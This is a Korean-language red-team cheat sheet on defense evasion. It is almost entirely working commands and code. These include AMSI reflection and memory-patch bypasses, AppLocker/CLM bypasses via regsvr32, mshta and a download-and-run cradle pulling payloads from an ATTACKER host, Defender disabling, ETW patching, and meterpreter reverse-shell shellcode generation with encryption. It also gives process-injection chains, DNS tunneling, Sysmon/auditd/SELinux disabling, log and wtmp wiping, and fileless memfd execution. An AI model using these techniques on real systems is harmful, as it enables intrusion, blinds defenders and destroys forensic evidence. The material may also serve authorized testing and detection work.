# Defense Evasion

AV / EDR 을 피해 가면서 payload 를 돌리고, 기존의 보안 통제 (AppLocker, AMSI, Constrained Language Mode) 를 풀거나 우회하는 영역.

이에 앞서 현재 호스트에 어떤 보안 솔루션이 깔려 있는지 반드시 먼저 확인해야 한다. 모르고 들이밀었다간 EDR 이 바로 경보를 때린다.

### AV/EDR 확인

```powershell
# 실행 중인 프로세스에서 AV/EDR 프로세스 확인
Get-Process
tasklist /V
wmic process get ProcessId,Description,ParentProcessId

# Defender 상태 확인
Get-MpPreference | Select-Object DisableRealtimeMonitoring

# Windows Security Center 등록 AV
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
```

**주요 AV/EDR 프로세스 이름:**

| 프로세스 | 제품 |
|----------|------|
| MsMpEng.exe | Windows Defender |
| cb.exe, RepUx.exe | Carbon Black |
| CylanceSvc.exe | Cylance |
| CSFalconService.exe | CrowdStrike Falcon |
| SentinelAgent.exe | SentinelOne |
| xagt.exe | Trellix (FireEye) |
| TmListen.exe | Trend Micro |

### 방화벽

```powershell
Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction
netsh advfirewall show allprofiles
```

### AMSI 상태

AMSI(Antimalware Scan Interface)는 PowerShell, VBScript 등의 스크립트 실행 시 악성 여부를 검사하는 인터페이스.

```powershell
# AMSI 활성화 상태에서 악성 스크립트 실행 시
# "This script contains malicious content and has been blocked by your antivirus software." 에러 발생

# AMSI가 비활성화된 경우
# "The term 'xxx' is not recognized..." 에러 발생 (정상적인 실행 실패)
```

### .NET 버전

.NET 4.8+ 환경에서는 .NET AMSI가 활성화되어 있으므로 C# 기반 도구 실행 시에도 탐지될 수 있다.

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | \
  Get-ItemProperty -Name version -EA 0 | \
  Where { $_.PSChildName -Match '^(?!S)\p{L}'} | \
  Select PSChildName, version
```

### PowerShell Constrained Language Mode (CLM)

CLM이 활성화되면 .NET 클래스 접근, COM 객체 생성 등이 제한된다.

```powershell
# 현재 Language Mode 확인
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = 제한 없음
# ConstrainedLanguage = 제한됨
```

### AppLocker

```powershell
# AppLocker 정책 확인
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections

# Registry에서 확인
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\ -Recurse
```

### Credential Guard

Credential Guard가 활성화되면 lsass 메모리에서 NTLM hash를 dump할 수 없다.

```powershell
(Get-ComputerInfo).DeviceGuardSecurityServicesConfigured
```

### PowerShell ExecutionPolicy

```powershell
# 현재 정책 확인
Get-ExecutionPolicy -List

# Bypass로 변경 (현재 session만)
$env:PSExecutionPolicyPreference = "bypass"
# 또는
Set-ExecutionPolicy Bypass -Scope Process -Force
```

### PowerShell v2

CLM, AMSI 등이 적용되지 않는 PowerShell v2를 사용하려는 시도. .NET 2.0이 설치되어 있어야 동작한다.
최신 Windows에서는 기본 비활성화되어 있는 경우가 많다.

```powershell
powershell.exe -version 2
```

---

## AMSI Bypass

!!! warning
    아래 기법들은 시그니처 기반으로 탐지될 수 있다. 실전에서는 변형이 필요하다.

### Reflection 기반 (가장 기본)

```powershell
# amsiInitFailed 플래그 설정
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 난독화 버전 (시그니처 우회)
$a=[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')
$b=$a.GetField('amsi'+'InitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

### AmsiScanBuffer 패치

```powershell
# AmsiScanBuffer를 메모리에서 패치하여 항상 AMSI_RESULT_CLEAN 반환
# 아래는 개념 코드 — 실전에서는 난독화/변형 필수
$win32 = @"
using System;using System.Runtime.InteropServices;
public class Win32{
    [DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
    [DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint np,out uint op);
}
"@
Add-Type $win32
$addr=[Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"),"AmsiScanBuffer")
$p=0;[Win32]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p)
$patch=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$addr,6)
```

### PowerShell Downgrade

```powershell
# PS v2는 AMSI 미지원
powershell.exe -version 2 -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')"
```

### 문자열 연결 (간단한 우회)

```powershell
# 시그니처 기반 탐지를 문자열 분할로 우회
$a = 'Ams'; $b = 'iUtils'
[Ref].Assembly.GetType("System.Management.Automation.$a$b")
```

---

## CLM (Constrained Language Mode) Bypass

```powershell
# 현재 Language Mode 확인
$ExecutionContext.SessionState.LanguageMode

# PowerShell v2로 다운그레이드 (CLM 미적용)
powershell.exe -version 2

# PSByPassCLM (InstallUtil 악용)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U C:\temp\PSByPassCLM.exe

# MSBuild (AppLocker + CLM 동시 우회)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\temp\payload.xml

# 커스텀 Runspace (C# 코드로 CLM 없는 Runspace 생성)
# PowerShdll, p0wnedShell 등 활용
```

---

## AppLocker Bypass

```powershell
# AppLocker 정책 확인
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections

# 기본 허용 경로에서 실행
# C:\Windows\Tasks\
# C:\Windows\Temp\
# C:\Windows\Tracing\

# MSBuild.exe (Microsoft 서명 binary)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

# InstallUtil.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# Regsvr32.exe (원격 SCT 파일)
regsvr32 /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll

# MSHTA
mshta http://ATTACKER/payload.hta
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c calc"":close")

# WMIC
wmic process call create "C:\temp\payload.exe"

# Rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("w=new ActiveXObject('WScript.Shell');w.Run('cmd /c calc')")

# LOLBAS 프로젝트 참고: https://lolbas-project.github.io
```

---

## Windows Defender 우회

```powershell
# 실시간 보호 비활성화 (관리자 권한, Tamper Protection 꺼져 있어야 함)
Set-MpPreference -DisableRealtimeMonitoring $true

# 특정 경로 제외
Set-MpPreference -ExclusionPath "C:\Windows\Temp"

# 특정 프로세스 제외
Set-MpPreference -ExclusionProcess "payload.exe"

# 제외 경로 확인
Get-MpPreference | Select ExclusionPath, ExclusionProcess, ExclusionExtension
```

---

## ETW (Event Tracing for Windows) 우회

```csharp
// EtwEventWrite 패치 (C#)
// ntdll!EtwEventWrite의 첫 바이트를 ret(0xC3)로 덮어써서 이벤트 기록 차단
var ntdll = Win32.GetModuleHandle("ntdll.dll");
var etwFunc = Win32.GetProcAddress(ntdll, "EtwEventWrite");
uint oldProtect;
Win32.VirtualProtect(etwFunc, 1, 0x40, out oldProtect);  // PAGE_EXECUTE_READWRITE
Marshal.WriteByte(etwFunc, 0xC3);  // ret
Win32.VirtualProtect(etwFunc, 1, oldProtect, out oldProtect);
```

```powershell
# 간단한 .NET ETW 비활성화
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([System.Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()),0)
```

---

## payload 회피 기법

### 일반 원칙

1. **시그니처 회피**: 공개된 도구를 그대로 사용하지 않는다. 소스 수정, 문자열 변경, 재컴파일 등을 수행한다.
2. **행위 탐지 회피**: 의심스러운 API 호출 패턴을 피한다. 직접 syscall 사용, unhooking 등을 고려한다.
3. **메모리 스캔 회피**: 메모리에 악성 패턴을 최소한으로 노출한다. 암호화된 셸코드를 런타임에 복호화하는 방식 등.

### 구체적 기법

| 기법 | 설명 | 도구/참고 |
|------|------|----------|
| Obfuscation | 코드/문자열 난독화 | Invoke-Obfuscation, ConfuserEx |
| Packing/Crypting | 실행 파일 암호화/압축 | UPX, custom packers |
| Shellcode Injection | 정상 프로세스에 셸코드 주입 | Process Hollowing, APC Injection |
| DLL Sideloading | 정상 애플리케이션의 DLL 검색 순서 악용 | 서명된 EXE + 악성 DLL |
| Direct Syscall | ntdll.dll 후킹 우회 | SysWhispers, HellsGate |
| Unhooking | EDR이 설치한 후크 제거 | ntdll.dll 재로딩 |
| PPID Spoofing | 부모 프로세스 ID 위장 | CreateProcess + STARTUPINFOEX |
| ETW Patching | Event Tracing for Windows 비활성화 | 위 ETW 우회 섹션 참고 |
| Sleep Obfuscation | 대기 중 메모리 암호화 | Ekko, Foliage |
| Timestomping | 파일 타임스탬프 조작 | PowerShell, Metasploit |

### Process Injection 기법

```text
Classic DLL Injection    → OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
Process Hollowing        → CreateProcess(SUSPENDED) → NtUnmapViewOfSection → WriteProcessMemory → ResumeThread
APC Injection           → QueueUserAPC + alertable thread
Early Bird Injection    → CreateProcess(SUSPENDED) → QueueUserAPC → ResumeThread
Module Stomping         → 정상 DLL 로드 후 해당 메모리에 shellcode 덮어쓰기
Syscall + Indirect Call → 직접 syscall + jmp [ntdll] 가젯
```

### AV Evasion 도구/언어

```bash
# Nim  — 탐지율 낮고 C 호환 FFI, Nimcrypt2, OffensiveNim
# Rust — 안전하고 빠름, RustPacker
# Go   — 크로스 컴파일 쉬움, ScareCrow
# C/C++ — 최고 수준 제어, 고전적 방법

# Shellcode 생성 및 암호화
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f raw -o payload.bin

# AES 암호화
openssl enc -aes-256-cbc -in payload.bin -out payload.enc -K $(openssl rand -hex 32) -iv $(openssl rand -hex 16)

# loader: 런타임에 복호화 → VirtualAlloc(RW) → 복사 → VirtualProtect(RX) → CreateThread
```

---

## 네트워크 레벨 우회

### Domain Fronting

```text
CDN(예: CloudFront) 뒤에 C2 서버를 배치.
TLS SNI와 HTTP Host header를 다르게 설정하여 정상 트래픽처럼 위장.
SNI: allowed-domain.com → CDN 통과
Host: c2.attacker.com → 실제 C2로 라우팅
```

### DNS Tunneling

```bash
# dnscat2
ruby dnscat2.rb tunnel.domain.com      # 서버
./dnscat2 tunnel.domain.com             # 클라이언트

# iodine
iodined -f 10.0.0.1 tunnel.domain.com  # 서버
iodine -f tunnel.domain.com            # 클라이언트
```

---

## 로깅 회피

### PowerShell 로깅 종류

| 로깅 유형 | 이벤트 로그 |
|-----------|------------|
| Script Block Logging | 4104 |
| Module Logging | 4103 |
| Transcription | 파일로 기록 |

### 이벤트 로그 삭제 (관리자 권한)

```powershell
# 특정 로그 삭제
wevtutil cl Security
wevtutil cl System
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# 전체 로그 삭제
Get-WinEvent -ListLog * | ForEach-Object { wevtutil cl $_.LogName 2>$null }
```

### Sysmon 우회

```powershell
# Sysmon 설치 확인
Get-Process sysmon* -ErrorAction SilentlyContinue
Get-Service sysmon* -ErrorAction SilentlyContinue
fltmc  # 미니필터 드라이버 확인

# Sysmon 설정 확인 (무엇을 모니터링하는지)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters"

# Sysmon 언로드 (관리자 + Sysmon binary 접근 필요)
sysmon -u

# 미니필터 언로드 (SYSTEM 권한)
fltMC unload SysmonDrv
```

---

## Linux 방어 우회

### Auditd 우회

```bash
# auditd 상태 확인
systemctl status auditd
auditctl -l  # 현재 규칙 목록

# 감사 규칙 일시 비활성화 (root 필요)
auditctl -e 0

# 특정 규칙 삭제
auditctl -d -a always,exit -F arch=b64 -S execve

# 감사 로그 삭제
echo "" > /var/log/audit/audit.log
```

### 로그 정리

```bash
# auth 로그 정리
echo "" > /var/log/auth.log
echo "" > /var/log/secure

# syslog 정리
echo "" > /var/log/syslog
echo "" > /var/log/messages

# journal 정리 (systemd)
journalctl --rotate && journalctl --vacuum-time=1s

# 특정 사용자의 로그인 기록 삭제
# utmpdump/utmpx 편집이 필요하며 복잡함
# wtmp에서 자신의 기록 필터링
utmpdump /var/log/wtmp | grep -v "attacker_user" | utmpdump -r > /var/log/wtmp.new
mv /var/log/wtmp.new /var/log/wtmp

# bash 히스토리 비활성화
unset HISTFILE
export HISTSIZE=0
set +o history
# 또는
ln -sf /dev/null ~/.bash_history
```

### SELinux / AppArmor 우회

```bash
# SELinux 상태 확인
getenforce
sestatus

# SELinux 일시 비활성화 (root)
setenforce 0

# AppArmor 상태 확인
aa-status
apparmor_status

# AppArmor 프로파일 비활성화 (root)
aa-disable /etc/apparmor.d/usr.sbin.sshd
# 또는 전체 비활성화
systemctl stop apparmor
```

### Timestomping (Linux)

```bash
# 파일 타임스탬프 조작
touch -r /etc/hosts /tmp/malicious.sh  # /etc/hosts와 같은 시간으로
touch -t 202301011200 /tmp/malicious.sh  # 특정 시간으로

# stat으로 확인
stat /tmp/malicious.sh
```

### eBPF 기반 EDR 우회

```bash
# eBPF 기반 보안 도구 확인 (Falco, Tetragon, Tracee 등)
bpftool prog list  # 로드된 BPF 프로그램 확인
ps aux | grep -E 'falco|tetragon|tracee'

# 우회 전략:
# - eBPF가 모니터링하지 않는 syscall 사용
# - 커널 모듈을 통한 직접적인 파일시스템 접근
# - memfd_create로 파일리스 실행
python3 -c "
import ctypes, os
libc = ctypes.CDLL('libc.so.6')
fd = libc.memfd_create(b'', 0)
os.write(fd, open('/tmp/payload','rb').read())
os.execve(f'/proc/self/fd/{fd}', ['payload'], os.environ)
"
```
